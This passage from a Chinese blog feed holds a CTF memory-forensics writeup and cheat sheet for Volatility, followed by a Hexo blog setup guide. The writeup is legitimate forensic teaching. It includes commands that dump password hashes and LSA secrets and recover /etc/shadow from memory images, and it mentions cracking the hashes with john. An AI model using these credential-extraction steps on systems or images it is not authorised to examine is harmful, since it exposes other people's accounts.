class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 pslist -p 2588</span><br></pre></td></tr></table></figure><h4 id="psscan"><a href="#psscan" class="headerlink" title="psscan"></a>psscan</h4><p>进程对象池扫描，隐藏或解链的进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 psscan</span><br></pre></td></tr></table></figure><p><strong>psscan：可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程</strong></p><h4 id="pstree"><a href="#pstree" class="headerlink" title="pstree"></a>pstree</h4><p>以树型方式打印进程列表，查看进程树，可以轻松了解各进程之间的关系：父进程与子进程 pstree</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 2008.raw –profile=Win2008R2SP1x64 pstree</span><br></pre></td></tr></table></figure><p>在进程中PPID比PID还大，那就可能这个进程有异常程序</p><h4 id="screenshot"><a href="#screenshot" class="headerlink" title="screenshot"></a>screenshot</h4><p>基于GDI Windows的虚拟屏幕截图保存，保存基于GDI窗口的伪截屏，屏幕截图screenshot</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 screenshot --dump-dir=./</span><br></pre></td></tr></table></figure><h4 id="shimcache"><a href="#shimcache" class="headerlink" title="shimcache"></a>shimcache</h4><p>解析应用程序兼容性Shim缓存注册表项，从内存文件中找到异常程序植入到系统的开机自启痕迹 shimcache</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 2008.raw –profile=Win2008R2SP1x64 shimcache</span><br></pre></td></tr></table></figure><h4 id="svcscan"><a href="#svcscan" class="headerlink" title="svcscan"></a>svcscan</h4><p>Windows服务列表扫描，查看服务查询服务名称，扫描 Windows 的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 svcscan</span><br></pre></td></tr></table></figure><h4 id="timeliner"><a href="#timeliner" class="headerlink" title="timeliner"></a>timeliner</h4><p>创建内存中的各种痕迹信息的时间线，最大程序提取信息timeliner，将所有操作系统事件以时间线的方式展开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 timeliner</span><br></pre></td></tr></table></figure><h4 id="userassist"><a href="#userassist" class="headerlink" title="userassist"></a>userassist</h4><p>打印注册表中UserAssist相关信息。查看运行程序相关的记录，比如最后一次更新时间，运行过的次数等。serassist</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 userassist</span><br></pre></td></tr></table></figure><h4 id="verinfo"><a href="#verinfo" class="headerlink" title="verinfo"></a>verinfo</h4><p>打印PE镜像中的版本信息，程序版本信息 verinfo，列出PE｜程序版本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 verinfo</span><br></pre></td></tr></table></figure><h4 id="volshell"><a href="#volshell" class="headerlink" title="volshell"></a>volshell</h4><p>内存镜像中的shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f xxx.vmem --profile= [操作系统] volshell</span><br><span class="line">#volshell       内存镜像中的shel</span><br></pre></td></tr></table></figure><p>如果能找到对应的系统类型，volshell会得到镜像中的shell信息，如果没有就进不去</p><h3 id="没有的部分"><a href="#没有的部分" class="headerlink" title="没有的部分"></a>没有的部分</h3><h4 id="lsadmp"><a href="#lsadmp" class="headerlink" title="lsadmp"></a>lsadmp</h4><p>查看用户名密码信息(密码是哈希值，需要john爆破) hashdump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 hashdump</span><br></pre></td></tr></table></figure><p>查看当前操作系统中的 password hash，例如 Windows 的 SAM 文件内容(mimikatz插件可以获取系统明文密码)</p><p>如果john爆破不出来，就使用 lasdmp 查看强密码 lsadmp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 lsadump</span><br></pre></td></tr></table></figure><h4 id="netscan"><a href="#netscan" class="headerlink" title="netscan"></a>netscan</h4><p>查看网络连接 获取当前系统 ip，有一些版本 这个命令是使用不了 这里我们就要使用（connscan,connections)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 netscan</span><br></pre></td></tr></table></figure><h4 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h4><p>显示关于计算机及其操作系统的详细配置信息（插件）systeminfo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.vmem --profile=Win7SP1x64 systeminfo</span><br></pre></td></tr></table></figure><h3 id="其他的速查表"><a href="#其他的速查表" class="headerlink" title="其他的速查表"></a>其他的速查表</h3><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>apihooks</td><td>检测内核及进程的内存空间中的API hook</td></tr><tr><td>atoms</td><td>列出会话及窗口站atom表</td></tr><tr><td>atomscan</td><td>Atom表的池扫描(Pool scanner)</td></tr><tr><td>auditpol</td><td>列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息</td></tr><tr><td>bigpools</td><td>使用BigPagePoolScanner转储大分页池(big page pools)</td></tr><tr><td>bioskbd</td><td>从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出BIOS开机密码)</td></tr><tr><td>cachedump</td><td>获取内存中缓存的域帐号的密码哈希</td></tr><tr><td>callbacks</td><td>打印全系统通知例程</td></tr><tr><td>crashinfo</td><td>提取崩溃转储信息</td></tr><tr><td>deskscan</td><td>tagDESKTOP池扫描(Poolscaner)</td></tr><tr><td>devicetree</td><td>显示设备树信息</td></tr><tr><td>dlldump</td><td>从进程地址空间转储动态链接库</td></tr><tr><td>driverirp</td><td>IRP hook驱动检测</td></tr><tr><td>drivermodule</td><td>关联驱动对象至内核模块</td></tr><tr><td>driverscan</td><td>驱动对象池扫描</td></tr><tr><td>dumpcerts</td><td>提取RAS私钥及SSL公钥</td></tr><tr><td>dumpregistry</td><td>转储内存中注册表信息至磁盘</td></tr><tr><td>eventhooks</td><td>打印Windows事件hook详细信息</td></tr><tr><td>evtlogs</td><td>提取Windows事件日志（仅支持XP/2003)</td></tr><tr><td>gahti</td><td>转储用户句柄（handle）类型信息</td></tr><tr><td>gditimers</td><td>打印已安装的GDI计时器(timers)及回调(callbacks)</td></tr><tr><td>gdt</td><td>显示全局描述符表(Global Deor Table)</td></tr><tr><td>getservicesids</td><td>获取注册表中的服务名称并返回SID信息</td></tr><tr><td>getsids</td><td>打印每个进程的SID信息</td></tr><tr><td>handles</td><td>打印每个进程打开的句柄的列表</td></tr><tr><td>hivescan</td><td>注册表配置单元池扫描</td></tr><tr><td>hpakextract</td><td>从HPAK文件（Fast Dump格式）提取物理内存数据</td></tr><tr><td>hpakinfo</td><td>查看HPAK文件属性及相关信息</td></tr><tr><td>idt</td><td>显示中断描述符表(Interrupt Deor Table)</td></tr><tr><td>hibinfo</td><td>转储休眠文件信息</td></tr><tr><td>imagecopy</td><td>将物理地址空间导出原生DD镜像文件</td></tr><tr><td>impscan</td><td>扫描对导入函数的调用</td></tr><tr><td>joblinks</td><td>打印进程任务链接信息</td></tr><tr><td>kdbgscan</td><td>搜索和转储潜在KDBG值</td></tr><tr><td>kpcrscan</td><td>搜索和转储潜在KPCR值</td></tr><tr><td>ldrmodules</td><td>检测未链接的动态链接DLL</td></tr><tr><td>lsadump</td><td>从注册表中提取LSA密钥信息（已解密）</td></tr><tr><td>machoinfo</td><td>转储Mach-O 文件格式信息</td></tr><tr><td>malfind</td><td>查找隐藏的和插入的代码</td></tr><tr><td>mbrparser</td><td>扫描并解析潜在的主引导记录(MBR)</td></tr><tr><td>memmap</td><td>打印内存映射</td></tr><tr><td>messagehooks</td><td>桌面和窗口消息钩子的线程列表</td></tr><tr><td>moddump</td><td>转储内核驱动程序到可执行文件的示例</td></tr><tr><td>modscan</td><td>内核模块池扫描</td></tr><tr><td>modules</td><td>打印加载模块的列表</td></tr><tr><td>multiscan</td><td>批量扫描各种对象</td></tr><tr><td>mutantscan</td><td>对互斥对象池扫描</td></tr><tr><td>objtypescan</td><td>扫描窗口对象类型对象</td></tr><tr><td>patcher</td><td>基于页面扫描的补丁程序内存</td></tr><tr><td>poolpeek</td><td>可配置的池扫描器插件</td></tr><tr><td>privs</td><td>显示进程权限</td></tr><tr><td>procdump</td><td>进程转储到一个可执行文件示例</td></tr><tr><td>psxview</td><td>查找带有隐藏进程的所有进程列表</td></tr><tr><td>qemuinfo</td><td>转储 Qemu 信息</td></tr><tr><td>raw2dmp</td><td>将物理内存原生数据转换为windbg崩溃转储格式</td></tr><tr><td>servicediff</td><td>Windows服务列表(ala Plugx)</td></tr><tr><td>sessions</td><td><code>_MM_SESSION_SPACE</code>的详细信息列表(用户登录会话)</td></tr><tr><td>shellbags</td><td>打印Shellbags信息</td></tr><tr><td>shutdowntime</td><td>从内存中的注册表信息获取机器关机时间</td></tr><tr><td>sockets</td><td>打印已打开套接字列表</td></tr><tr><td>sockscan</td><td>TCP套接字对象池扫描</td></tr><tr><td>ssdt</td><td>显示SSDT条目</td></tr><tr><td>strings</td><td>物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)</td></tr><tr><td>timers</td><td>打印内核计时器及关联模块的DPC</td></tr><tr><td>truecryptmaster    Recover</td><td>恢复TrueCrypt 7.1a主密钥</td></tr><tr><td>truecryptpassphrase</td><td>查找并提取TrueCrypt密码</td></tr><tr><td>truecryptsummary</td><td>TrueCrypt摘要信息</td></tr><tr><td>unloadedmodules</td><td>打印卸载的模块信息列表</td></tr><tr><td>userhandles</td><td>转储用户句柄表</td></tr><tr><td>vaddump</td><td>转储VAD数据为文件</td></tr><tr><td>vadinfo</td><td>转储VAD信息</td></tr><tr><td>vadtree</td><td>以树形方式显示VAD树信息</td></tr><tr><td>vadwalk</td><td>显示遍历VAD树</td></tr><tr><td>vboxinfo</td><td>转储Virtualbox信息（虚拟机）</td></tr><tr><td>windows</td><td>打印桌面窗口(详细信息)</td></tr><tr><td>wintree</td><td>顺序打印桌面窗口树</td></tr><tr><td>wndscan</td><td>池扫描窗口站</td></tr><tr><td>yarascan</td><td>以Yara签名扫描进程或内核内存</td></tr><tr><td>vmwareinfo</td><td>转储VMware VMSS/VMSN 信息</td></tr><tr><td>symlinkscan</td><td>符号链接对象池扫描</td></tr><tr><td>thrdscan</td><td>线程对象池扫描</td></tr><tr><td>threads</td><td>调查_<code>ETHREAD</code> 和_<code>KTHREADs</code></td></tr></tbody></table><h2 id="volatility制作profile"><a href="#volatility制作profile" class="headerlink" title="volatility制作profile"></a>volatility制作profile</h2><p><a href="https://mp.weixin.qq.com/s/dbHGBzjcMoF8aPqIkCN_Fg">https://mp.weixin.qq.com/s/dbHGBzjcMoF8aPqIkCN_Fg</a></p><p>2022祥云杯</p><p>首先使用Linux命令提取出系统的内核版本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings 1.mem|grep Linux |grep generic</span><br></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux 5.4.0-84-generic Ubuntu 18.04.6 LTS</span><br></pre></td></tr></table></figure><p>内核版本信息：Linux 5.4.0-84-generic，系统版本信息：Ubuntu 18.04.6 LTS。</p><p><del>如果不知道系统版本只能靠猜测和经验。</del></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ docker pull ubuntu</span><br><span class="line">└─$ docker images</span><br><span class="line">└─$ docker run -itd -P rocm/dev-ubuntu-18.04:latest</span><br><span class="line">└─$ docker ps </span><br><span class="line">└─$ docker exec -it f7 /bin/bash</span><br></pre></td></tr></table></figure><p><del>此处需要注意的是：如果发现docker里面的内核版本太高了，可能需要用iso构建基础镜像</del></p><p>ps查看有没有合适的内核版本可以使用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt search linux |grep generic |grep headers</span><br></pre></td></tr></table></figure><p>此处发现docker搭建的版本普遍比虚拟机里的高一截，所以换成了iso构建的基础镜像</p><h3 id="下载指定版本的内核"><a href="#下载指定版本的内核" class="headerlink" title="下载指定版本的内核"></a>下载指定版本的内核</h3><p>可以进入到Ubuntu的系统中然后可以看到/boot没有东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls /boot/</span><br><span class="line">apt search linux |grep generic |grep headers</span><br><span class="line">apt install -y linux-headers-5.4.0-84-generic linux-image-5.4.0-84-generic dwarfdump build-essential</span><br></pre></td></tr></table></figure><p>命令执行等待一段时间之后可以发现在/boot目录中多了几个文件：System.map-5.4.0-84-generic</p><p><img src="/image/media/2022/vol/4.png"></p><p>然后把volatility2下载到该机器中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/volatilityfoundation/volatility.git</span><br><span class="line">cd volatility/tools/linux   #此处ls可以看到Makefile</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>此处可以发现可能存在错误，导致make失败</p><p><img src="/image/media/2022/vol/5.png"></p><p>需要替换module,c文件中的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;s/$(shell uname -r)/5.4.0-84-generic/g&#x27; Makefile</span><br><span class="line">echo &#x27;MODULE_LICENSE(&quot;GPL&quot;);&#x27; &gt;&gt; module.c</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>可以看到生成了一个module.dwarf文件</p><p>此时我们可以把上述的两个文件：/boot/volatility/tools/linuxmodule.dwarf和/boot/System.map-5.4.0-84-generic打包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip ubuntu.zip /boot/volatility/tools/linux/module.dwarf /boot/System.map-5.4.0-84-generic</span><br></pre></td></tr></table></figure><h3 id="使用自定义profile"><a href="#使用自定义profile" class="headerlink" title="使用自定义profile"></a>使用自定义profile</h3><ul><li>复制之前查看已有的profile信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py  --info | grep Linux</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/vol/6.png"></p><p>可以看到只有一个pronfile信息</p><p>在复制之前可以查看镜像的imageinfo信息，但是可以看到需要等待很久</p><p><img src="/image/media/2022/vol/12.png"></p><ul><li>复制之后</li></ul><p>将压缩包复制到需要取证的机器的volatility目录下</p><p>可以将文件复制到XXX/volatility-python/volatility/plugins/overlays/linux目录下</p><p><strong>此处有坑，如果使用了volatility提供的setup.py将vol.py注册成系统命令后就会发现出入信息</strong></p><p><img src="/image/media/2022/vol/7.png"></p><p>可以发现此处可以使用命令执行取证操作了</p><p>查看进程信息和文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f 1.mem --profile=LinuxUbuntu_5_4_0-84-generic_profilex64 linux_enumerate_files | grep &#x27;Desktop&#x27;</span><br><span class="line">python2 vol.py -f 1.mem --profile=LinuxUbuntu_5_4_0-84-generic_profilex64 linux_pslist</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/vol/8.png"></p><p>查看历史执行的命令，历史记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f 1.mem --profile=LinuxUbuntu_5_4_0-84-generic_profilex64 linux_bash</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/vol/9.png"></p><p>进程和完整的命令行和开始时间：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f 1.mem --profile=LinuxUbuntu_5_4_0-84-generic_profilex64 linux_psaux </span><br><span class="line">python2 vol.py -f 1.mem --profile=LinuxUbuntu_5_4_0-84-generic_profilex64 linux_psaux |grep zip</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/vol/10.png"></p><p>列出文件位置，ps：有点慢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f 1.mem --profile=LinuxUbuntu_5_4_0-84-generic_profilex64 linux_find_file  -F &quot;/home/bob/Desktop/secret.zip&quot;</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/vol/11.png"></p><p>尝试恢复文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f 1.mem --profile=LinuxUbuntu_5_4_0-84-generic_profilex64 linux_find_file -i 0xffff97ce37a94568 -O /home/t/secret.zip</span><br></pre></td></tr></table></figure><p>同理提取指定文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f 1.mem --profile=LinuxUbuntu_5_4_0-84-generic_profilex64 linux_find_file  -F &quot;/etc/shadow&quot;</span><br><span class="line">python2 vol.py -f 1.mem --profile=LinuxUbuntu_5_4_0-84-generic_profilex64 linux_find_file -i 上一步16进制 -O 输出保存的位置</span><br></pre></td></tr></table></figure><p><strong>上面的命令可能需要使用windows执行。</strong></p><h2 id="veracryto"><a href="#veracryto" class="headerlink" title="veracryto"></a>veracryto</h2><p>使用veracryto挂载镜像文件，选择盘符，选择文件点击加载，在弹出的框中输入密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">此处镜像文件可以是vmdk\bin\tar\mem等，需要密码信息</span><br><span class="line">注意的是同一个加密磁盘文件可以使用不同的密码挂载，挂载后的文件不一样</span><br></pre></td></tr></table></figure><p>挂载成功之后可以看到本地多了一个盘符，可以看到里面的文件信息</p><h2 id="FTK"><a href="#FTK" class="headerlink" title="FTK"></a>FTK</h2><p>使用FTK挂载文件，镜像路径不要出现中文，将Mount Method 设置为Writable，点击Mount，就可以看到多余的盘符信息。</p>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建纪要</title>
      <link href="/article/2022-11-25-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%BA%AA%E8%A6%81/"/>
      <url>/article/2022-11-25-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%BA%AA%E8%A6%81/</url>
      
        <content type="html"><![CDATA[<h1 id="博客搭建纪要"><a href="#博客搭建纪要" class="headerlink" title="博客搭建纪要"></a>博客搭建纪要</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>需要提前配置好</p><ul><li>node.js（直接点默认配置即可）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">官网地址：https://nodejs.org/en/</span><br></pre></td></tr></table></figure><p>查看是否安装成功：执行node可以看到版本即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin&gt;node</span><br><span class="line">Welcome to Node.js v14.20.0.</span><br><span class="line">Type &quot;.help&quot; for more information.</span><br></pre></td></tr></table></figure><ul><li>Git（直接点默认配置即可）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">官网地址：https://git-scm.com/</span><br></pre></td></tr></table></figure><p>查看是否安装成功：执行git –version可以看到版本即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin&gt;git --version</span><br><span class="line">git version 2.33.0.windows.2</span><br></pre></td></tr></table></figure><p>同时windows右键的时候可以看到有几个git的选项：git bush here之类的。</p><h2 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h2><p>如果准备工作完成可以开始安装hexo，可以在自己喜欢的地方新建一个文件夹（后续博客内容都在这个文件夹里面），然后进这个文件夹右键选择git bush here进入git终端执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>安装完成后，输入 hexo init 命令初始化博客：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>静态部署</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g  #静态部署</span><br><span class="line">hexo s  #启动</span><br></pre></td></tr></table></figure><p>可以看到在本地有一个4000端口，能够访问 <a href="http://localhost:4000表示本地部署成功">http://localhost:4000表示本地部署成功</a></p><h3 id="基础构建"><a href="#基础构建" class="headerlink" title="基础构建"></a>基础构建</h3><h4 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题"></a>安装主题</h4><p>在博客文件夹中操作</p><p>可以预先找到合适的主题然后使用git进行clone</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>如果沒有pug以及stylus的渲染器，还需要下载，否则在项目运行时会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>修改项目根目录下的_config.yml文件（称为站点配置文件），开启主题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Extensions</span><br><span class="line">## Plugins: https://hexo.io/plugins/</span><br><span class="line">## Themes: https://hexo.io/themes/</span><br><span class="line">#theme: landscape</span><br><span class="line">theme: butterfly</span><br></pre></td></tr></table></figure><p>为了減少升级主题带来的不便，我们还需要做以下操作：</p><p>把主题文件夹中的 <code>_config.yml</code> 复制到 Hexo 根目录下，同重命名为 <code>_config.butterfly.yml</code></p><h4 id="部署到github"><a href="#部署到github" class="headerlink" title="部署到github"></a>部署到github</h4><p>打开根目录下的 _config.yml文件夹，在文件底部添加内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git#推送类型GitHub应该是git，gitee应该是其他</span><br><span class="line">  repository: https://github.com/xxx/xxx.github.io.git  #你的仓库地址</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>博客所在文件夹中，打开 Git Bash，安装Git部署插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>继续输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean   #清除缓存文件 db.json 和已生成的静态文件 public</span><br><span class="line">hexo g       #生成网站静态文件到默认设置的 public 文件夹(hexo generate 的缩写)</span><br><span class="line">hexo d       #自动生成网站静态文件，并部署到设定的仓库(hexo deploy 的缩写)</span><br></pre></td></tr></table></figure><p>在这个hexo d的时候可能会涉及到一个登录操作：需要登陆github或者全局配置一下账号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email &quot;你的邮箱地址&quot;</span><br><span class="line">git config --global user.name &quot;用户昵称&quot;</span><br></pre></td></tr></table></figure><p>执行hexo d之后可以看到GitHub主页中的action中有一些进程在运行就表示推送成功。</p><p>网络原因有可能会导致超时可以重新执行。</p><h3 id="个性化"><a href="#个性化" class="headerlink" title="个性化"></a>个性化</h3><h4 id="安装主题-1"><a href="#安装主题-1" class="headerlink" title="安装主题"></a>安装主题</h4><p>在hexo项目根目录下执行操作clone主题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>如果沒有 pug 以及 stylus 的渲染器，还需要下载，否则在项目运行时会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>修改项目根目录下的_config.yml文件（称为站点配置文件），开启主题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Extensions</span><br><span class="line">## Plugins: https://hexo.io/plugins/</span><br><span class="line">## Themes: https://hexo.io/themes/</span><br><span class="line">#theme: landscape</span><br><span class="line">theme: butterfly</span><br></pre></td></tr></table></figure><ul><li>升级建议</li></ul><p>为了減少升级主题带来的不便，我们还需要做以下操作：</p><p>把主题文件夹中的 _config.yml 复制到 Hexo 根目录下，同重命名为 _config.butterfly.yml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hexo会自动合并主题中的_config.yml和 _config.butterfly.yml里的配置，如果存在同名配置，会使用_config.butterfly.yml的配置，其优先度较高。</span><br></pre></td></tr></table></figure><h4 id="个人资料"><a href="#个人资料" class="headerlink" title="个人资料"></a>个人资料</h4><p>主要操作都是修改根目录下的站点配置文件_config.yml</p><p>修改网站各种资料，例如标题、副标题和邮箱等个人资料</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># Hexo Configuration</span><br><span class="line">## Docs: https://hexo.io/docs/configuration.html</span><br><span class="line">## Source: https://github.com/hexojs/hexo/</span><br><span class="line"></span><br><span class="line"># Site</span><br><span class="line">title: XXXX#标题</span><br><span class="line">subtitle: &#x27;XXXX&#x27;#副标题</span><br><span class="line">description: XXXX#个性签名</span><br><span class="line">keywords:XXXX#关键词</span><br><span class="line">author: XXXX#作者</span><br><span class="line">language: zh-CN#语言</span><br><span class="line">timezone: Asia/Shanghai    #中国的时区</span><br></pre></td></tr></table></figure><p>主题支持三种语言：</p><ul><li><p>default(en)</p></li><li><p>zh-CN (简体中文)</p></li><li><p>zh-TW (繁体中文)</p></li></ul><h4 id="导航菜单"><a href="#导航菜单" class="headerlink" title="导航菜单"></a>导航菜单</h4><p>修改主题配置文件<code>_config.butterfly.yml</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  首页: / || fas fa-home</span><br><span class="line">  归档: /archives/ || fas fa-archive</span><br><span class="line">  标签: /tags/ || fas fa-tags</span><br><span class="line">  分类: /categories/ || fas fa-folder-open</span><br><span class="line">  工具 || fas fa-list:</span><br><span class="line">      CyberChef: /CyberChef/ || fas fa-music</span><br><span class="line">      Linux命令大全: /Linux-command/ || fas fa-video</span><br><span class="line">  友情链接: /link/ || fas fa-link</span><br><span class="line">  